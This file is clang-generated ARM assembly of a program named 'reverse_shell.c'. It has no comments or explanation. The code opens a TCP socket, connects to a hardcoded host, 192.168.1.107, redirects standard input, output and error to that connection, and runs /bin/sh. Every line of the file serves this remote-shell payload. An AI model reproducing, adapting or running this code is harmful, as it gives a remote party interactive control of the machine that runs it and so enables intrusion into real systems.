	.text
	.syntax unified
	.eabi_attribute	67, "2.09"
	.eabi_attribute	6, 10
	.eabi_attribute	7, 65
	.eabi_attribute	8, 1
	.eabi_attribute	9, 2
	.fpu	neon
	.eabi_attribute	34, 1
	.eabi_attribute	15, 1
	.eabi_attribute	16, 1
	.eabi_attribute	17, 2
	.eabi_attribute	20, 1
	.eabi_attribute	21, 0
	.eabi_attribute	23, 3
	.eabi_attribute	24, 1
	.eabi_attribute	25, 1
	.eabi_attribute	38, 1
	.eabi_attribute	18, 4
	.eabi_attribute	26, 2
	.eabi_attribute	14, 0
	.file	"reverse_shell.c"
	.globl	main
	.p2align	2
	.type	main,%function
	.code	32
main:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#32
	sub	sp, sp, #32
	movw	r0, #2
	movw	r1, #1
	movw	r2, #0
	bl	socket
	str	r0, [r11, #-4]
	movw	r0, #2
	strh	r0, [sp, #12]
	movw	r0, #24438
	strh	r0, [sp, #14]
	add	r0, sp, #12
	add	r2, r0, #4
	movw	r0, #2
	ldr	r1, .LCPI0_2
.LPC0_2:
	add	r1, pc, r1
	bl	inet_pton
	ldr	r0, [r11, #-4]
	add	r1, sp, #12
	movw	r2, #16
	bl	connect
	ldr	r0, [r11, #-4]
	movw	r1, #0
	bl	dup2
	ldr	r0, [r11, #-4]
	movw	r1, #1
	bl	dup2
	ldr	r0, [r11, #-4]
	movw	r1, #2
	bl	dup2
	ldr	r0, .LCPI0_1
.LPC0_1:
	add	r0, pc, r0
	ldr	r1, [r0]
	str	r1, [sp, #4]
	ldr	r0, [r0, #4]
	str	r0, [sp, #8]
	add	r1, sp, #4
	ldr	r0, .LCPI0_0
.LPC0_0:
	add	r0, pc, r0
	movw	r2, #0
	bl	execve
	movw	r0, #0
	mov	sp, r11
	pop	{r11, pc}
	.p2align	2
@ %bb.1:
.LCPI0_0:
	.long	.L.str.1-(.LPC0_0+8)
.LCPI0_1:
	.long	.L__const.main.argv-(.LPC0_1+8)
.LCPI0_2:
	.long	.L.str-(.LPC0_2+8)
.Lfunc_end0:
	.size	main, .Lfunc_end0-main
	.cantunwind
	.fnend
	.type	.L.str,%object
	.section	.rodata.str1.1,"aMS",%progbits,1
.L.str:
	.asciz	"192.168.1.107"
	.size	.L.str, 14

	.type	.L.str.1,%object
.L.str.1:
	.asciz	"/bin/sh"
	.size	.L.str.1, 8

	.type	.L__const.main.argv,%object
	.section	.data.rel.ro,"aw",%progbits
	.p2align	2, 0x0
.L__const.main.argv:
	.long	.L.str.1
	.long	0
	.size	.L__const.main.argv, 8

	.ident	"clang version 17.0.6"
	.section	".note.GNU-stack","",%progbits
